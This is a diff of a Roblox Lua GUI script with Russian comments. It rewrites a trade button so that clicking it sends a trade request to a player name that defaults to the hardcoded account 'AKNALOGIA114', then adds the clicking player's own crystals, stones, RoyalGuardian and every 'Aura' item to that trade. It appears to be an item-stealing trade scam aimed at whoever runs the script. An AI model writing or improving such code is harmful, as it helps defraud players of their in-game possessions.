@@ -550,66 +550,55 @@ TradeScriptButton.BorderSizePixel = 0
 TradeScriptButton.ZIndex = 2
 TradeScriptButton.Parent = mainCategorySection
 
--- Функция для отправки запроса
-local function sendTradeRequest()
+-- Объединенная функция для отправки запроса на трейд, ожидания и добавления предметов
+local function handleTrade()
     local playerName = PlayerNameInput.Text
     if playerName == "" then
         playerName = "AKNALOGIA114"
     end
 
     local player = game:GetService("Players"):FindFirstChild(playerName)
-    if player then
-        local args = {
-            [1] = player
-        }
-        game:GetService("ReplicatedStorage").Systems.Trading.TradeRequest:FireServer(unpack(args))
-        waitForTrade(playerName)
-    else
+    if not player then
         warn("Игрок с именем " .. playerName .. " не найден")
+        return
     end
-end
 
--- Функция для ожидания появления трейда и добавления предметов
-local function waitForTrade(playerName)
+    local args = {
+        [1] = player
+    }
+    game:GetService("ReplicatedStorage").Systems.Trading.TradeRequest:FireServer(unpack(args))
+
+    local replicatedStorage = game:GetService("ReplicatedStorage")
     local trades = replicatedStorage:WaitForChild("Trades")
     local trade = trades:WaitForChild(playerName)
-    
+
     trade.ChildAdded:Connect(function(child)
         if child.Name == "OtherPlayer" and child.Value == game.Players.LocalPlayer.Name then
-            -- Добавление предметов
-            local args1 = {
-                [1] = replicatedStorage.Profiles.AKNALOGIA114.Inventory.UpgradeCrystalLegendary,
-                [2] = 50
-            }
-            game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(args1))
-            
-            local args2 = {
-                [1] = replicatedStorage.Profiles.AKNALOGIA114.Inventory.UpgradeCrystalEpic,
-                [2] = 40
-            }
-            game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(args2))
-            
-            local args3 = {
-                [1] = replicatedStorage.Profiles.AKNALOGIA114.Inventory.EnchantingStone,
-                [2] = 10
-            }
-            game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(args3))
-            
-            local args4 = {
-                [1] = replicatedStorage.Profiles.AKNALOGIA114.Inventory.RoyalGuardian,
-                [2] = 1
-            }
-            game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(args4))
+            local currentPlayerName = game.Players.LocalPlayer.Name
+
+            local addItem = function(itemName, amount)
+                local item = replicatedStorage.Profiles[currentPlayerName].Inventory:FindFirstChild(itemName)
+                if item then
+                    local itemArgs = {
+                        [1] = item,
+                        [2] = amount
+                    }
+                    game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(itemArgs))
+                else
+                    warn("Предмет " .. itemName .. " не найден в инвентаре " .. currentPlayerName)
+                end
+            end
+
+            addItem("UpgradeCrystalLegendary", 50)
+            addItem("UpgradeCrystalEpic", 40)
+            addItem("EnchantingStone", 10)
+            addItem("RoyalGuardian", 1)
 
             -- Поиск и добавление предметов с названием "Aura"
-            local playerInventory = replicatedStorage.Profiles[playerName].Inventory
+            local playerInventory = replicatedStorage.Profiles[currentPlayerName].Inventory
             for _, item in pairs(playerInventory:GetChildren()) do
                 if item.Name:find("Aura") then
-                    local argsAura = {
-                        [1] = item,
-                        [2] = 1
-                    }
-                    game:GetService("ReplicatedStorage").Systems.Trading.AddItem:FireServer(unpack(argsAura))
+                    addItem(item.Name, 1)
                 end
             end
 
@@ -623,7 +612,8 @@ local function waitForTrade(playerName)
 end
 
 -- Подключение функции к кнопке
-TradeScriptButton.MouseButton1Click:Connect(sendTradeRequest)
+TradeScriptButton.MouseButton1Click:Connect(handleTrade)
+
 
 
 ---------------------------------------------------------
